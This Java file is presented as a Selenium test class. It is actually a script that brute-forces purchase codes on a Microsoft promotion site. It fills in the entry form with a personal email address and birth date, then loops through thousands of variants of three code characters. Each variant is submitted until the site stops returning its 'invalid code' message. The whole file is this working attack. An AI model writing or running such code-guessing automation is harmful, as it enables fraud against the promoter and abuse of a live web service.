package org.wpjr2.xbox;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import com.thoughtworks.selenium.Selenium;
import com.thoughtworks.selenium.webdriven.WebDriverBackedSelenium;

public class SeleniumTest {
	private Selenium selenium;
	WebDriver driver;
	
	@Before
	public void setUp() throws Exception {
		System.setProperty("webdriver.chrome.driver", "c://dev/chromedriver.exe");
		driver = new ChromeDriver();
		String baseUrl = "https://microsoft.promo.eprize.com/";
		selenium = new WebDriverBackedSelenium(driver, baseUrl);
	}

	@Test
	public void testJavawebdriver() throws Exception {
		selenium.open("/nameyourgame/");
		selenium.select("name=country_code", "label=Brazil");
		selenium.click("css=button[type=\"submit\"]");
		selenium.waitForPageToLoad("30000");
		
		StringBuffer code = new StringBuffer("437KY-*&X3WKY4GJ");
		String chars1 = "KLMNOPQRSTUVWXYZ0123456789";
		String chars2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		String chars3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		selenium.click("id=primary_opt_in");
		selenium.click("id=rules_checkbox");
		selenium.type("id=email_2", "wrpiresjr@outlook.com");
		selenium.type("id=confirm_email", "wrpiresjr@outlook.com");
		selenium.select("name=age.birth_day", "label=2");
		selenium.select("name=age.birth_month", "label=Sep");
		selenium.select("name=age.birth_year", "label=1976");
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd hh:mm:ss");
		for (int i = 0; i < chars1.length(); i++){
			code.replace(5,6, chars1.charAt(i)+"");
			for (int k = 0; k < chars2.length(); k++){
				code.replace(6,7, chars2.charAt(k)+"");
				for (int l = 0; l < chars3.length(); l++){
					code.replace(7,8, chars3.charAt(l)+""); 
					selenium.type("id=purchase_code", code.toString());
					selenium.click("css=div.profile > div.row > div.column.small-12 > div.submit > button[type=\"submit\"]");
					selenium.waitForPageToLoad("30000");
					WebElement element = driver.findElement(By.xpath("/html/body/div[1]/div/div[3]/div/div/div[2]/div[2]/form/div/div[1]/div/p[2]"));
					if (element != null){
						if (element.getText().contains("Desculpe, este c") ||
								element.getText().contains("Sorry, this is not a valid code"))
						{
							System.out.println(sdf.format(
									Calendar.getInstance().getTime())+ " : " +  code + ": invalid: ");
						} else {
							System.out.println(" valid: ");
							System.exit(0);
						}
					}
				}				
			}
		}
	}

	@After
	public void tearDown() throws Exception {
		selenium.stop();
	}
}
